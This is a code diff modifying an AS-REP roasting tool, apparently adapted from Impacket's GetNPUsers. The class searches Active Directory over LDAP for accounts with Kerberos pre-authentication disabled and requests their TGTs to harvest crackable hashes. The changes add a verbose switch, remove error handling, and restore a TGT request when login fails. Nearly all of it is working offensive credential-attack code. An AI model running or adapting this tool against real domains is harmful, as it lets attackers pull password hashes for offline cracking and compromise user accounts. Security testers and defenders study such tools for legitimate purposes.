@@ -75,18 +75,19 @@ class GetUserNoPreAuth:
         self.__target = None
         self.__lmhash = ''
         self.__nthash = ''
-        self.__no_pass = cmdLineOptions.no_pass
-        self.__outputFileName = cmdLineOptions.outputfile
-        self.__outputFormat = cmdLineOptions.format
-        self.__usersFile = cmdLineOptions.usersfile
-        self.__aesKey = cmdLineOptions.aesKey
-        self.__doKerberos = cmdLineOptions.k
-        self.__requestTGT = cmdLineOptions.request
+        self.__no_pass = cmdLineOptions.get("no_pass")
+        self.__outputFileName = cmdLineOptions.get("outputfile")
+        self.__outputFormat = cmdLineOptions.get("format")
+        self.__usersFile = cmdLineOptions.get("usersfile")
+        self.__aesKey = cmdLineOptions.get("aesKey")
+        self.__doKerberos = cmdLineOptions.get("k")
+        self.__requestTGT = cmdLineOptions.get("request")
         #[!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
-        self.__kdcIP = cmdLineOptions.dc_ip
-        self.__kdcHost = cmdLineOptions.dc_host
-        if cmdLineOptions.hashes is not None:
-            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
+        self.__kdcIP = cmdLineOptions.get("dc_ip")
+        self.__kdcHost = cmdLineOptions.get("dc_host")
+        if cmdLineOptions.get("hashes") is not None:
+            self.__lmhash, self.__nthash = cmdLineOptions.get("hashes").split(':')
+        self.__verbose = cmdLineOptions.get("verbose")
 
         # Create the baseDN
         domainParts = self.__domain.split('.')
@@ -242,24 +243,22 @@ class GetUserNoPreAuth:
                 self.__target = self.__domain
 
             if self.__doKerberos:
-                logging.info('Getting machine hostname')
+                if self.__verbose:
+                    logging.info('Getting machine hostname')
                 self.__target = self.getMachineName(self.__target)
 
         # Are we asked not to supply a password?
         if self.__doKerberos is False and self.__no_pass is True:
             # Yes, just ask the TGT and exit
-            logging.info('Getting TGT for %s' % self.__username)
+            if self.__verbose:
+                logging.info('Getting TGT for %s' % self.__username)
             entry = self.getTGT(self.__username)
             self.outputTGT(entry, None)
             return
 
         # Connect to LDAP
         try:
-            try:
-                ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
-            except:
-                print("Unable to connect to LDAP Server.", file=sys.stderr)
-                return None
+            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
             if self.__doKerberos is not True:
                 ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
             else:
@@ -268,11 +267,7 @@ class GetUserNoPreAuth:
         except ldap.LDAPSessionError as e:
             if str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
-                try:
-                    ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
-                except:
-                    print("Unable to connect to LDAP Server.", file=sys.stderr)
-                    return None
+                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
                 if self.__doKerberos is not True:
                     ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                 else:
@@ -280,9 +275,11 @@ class GetUserNoPreAuth:
                                                  self.__aesKey, kdcHost=self.__kdcIP)
             else:
                 # Cannot authenticate, we will try to get this users' TGT (hoping it has PreAuth disabled)
-                print("Invalid credentials provided.", file=sys.stderr)
-                #entry = self.getTGT(self.__username) # mmmm
-                return None
+                if self.__verbose:
+                    logging.info('Cannot authenticate %s, getting its TGT' % self.__username)
+                entry = self.getTGT(self.__username)
+                self.outputTGT(entry, None)
+                return
 
 
         # Building the search filter
@@ -291,28 +288,34 @@ class GetUserNoPreAuth:
                        (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
 
         try:
-            logging.debug('Search Filter=%s' % searchFilter)
+            if self.__verbose:
+                logging.debug('Search Filter=%s' % searchFilter)
             resp = ldapConnection.search(searchFilter=searchFilter,
                                          attributes=['sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                          sizeLimit=999)
         except ldap.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
-                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
+                if self.__verbose:
+                    logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                 # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                 # paged queries
                 resp = e.getAnswers()
                 pass
             else:
                 if str(e).find('NTLMAuthNegotiate') >= 0:
-                    print("NTLM Authentication failed, NTLM is probably disabled on the domain.", file=sys.stderr)
+                    if self.__verbose:
+                        logging.critical("NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
+                                     "authentication instead.")
                 else:
-                    print("Error when querying LDAP for SPNs.", file=sys.stderr)
-
-                return None
+                    if self.__kdcIP is not None and self.__kdcHost is not None and self.__verbose:
+                        logging.critical("If the credentials are valid, check the hostname and IP address of KDC. They "
+                                         "must match exactly each other")
+                raise
 
         answers = []
-        logging.debug('Total of records returned %d' % len(resp))
+        if self.__verbose:
+            logging.debug('Total of records returned %d' % len(resp))
 
         for item in resp:
             if isinstance(item, ldapasn1.SearchResultEntry) is not True:
@@ -350,54 +353,37 @@ class GetUserNoPreAuth:
                 pass
 
         if len(answers)>0:
-            #self.printTable(answers, header=[ "Name", "MemberOf", "PasswordLastSet", "LastLogon", "UAC"])
-            #print('\n\n')
-
-            if self.__requestTGT is True:
-                usernames = [answer[0] for answer in answers]
-                asreps = self.request_multiple_TGTs(usernames)
-
-            return asreps
+            if self.__verbose:
+                self.printTable(answers, header=[ "Name", "MemberOf", "PasswordLastSet", "LastLogon", "UAC"])
+                print('\n\n')
+            
+            usernames = [answer[0] for answer in answers]
+            return self.request_multiple_TGTs(usernames)
 
         else:
-            return []
+            raise Exception('No NPAs found!')
 
     def request_users_file_TGTs(self):
-        try:
-            with open(self.__usersFile) as fi:
-                usernames = [line.strip() for line in fi]
-        except FileNotFoundError:
-            print("Can't find usersfile.")
-            return None
+        with open(self.__usersFile) as fi:
+            usernames = [line.strip() for line in fi]
 
         return self.request_multiple_TGTs(usernames)
 
     def request_multiple_TGTs(self, usernames):
-        asreps = []
+        tgts = []
         if self.__outputFileName is not None:
             fd = open(self.__outputFileName, 'w+')
         else:
             fd = None
         for username in usernames:
             try:
-                entry = self.getTGT(username)
-                if entry.startswith('$krb5asrep$'):
-                    asreps.append(entry)
-                #self.outputTGT(entry, fd)
+                tgts.append(self.getTGT(username))
             except Exception as e:
-                if "doesn't have UF_DONT_REQUIRE_PREAUTH set" in str(e):
-                    pass
-                elif "SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)" in str(e):
-                    print("The specified domain name is not valid.", file=sys.stderr)
-                    return None
-                elif "No route to host" in str(e) or "Connection timed out" in str(e):
-                    print("Host unreachable.", file=sys.stderr)
-                    return None
-                else:
-                    print(str(e), file=sys.stderr)
+                if self.__verbose:
+                    logging.error('%s' % str(e))
         if fd is not None:
             fd.close()
-        return asreps
+        return tgts
 
 
 
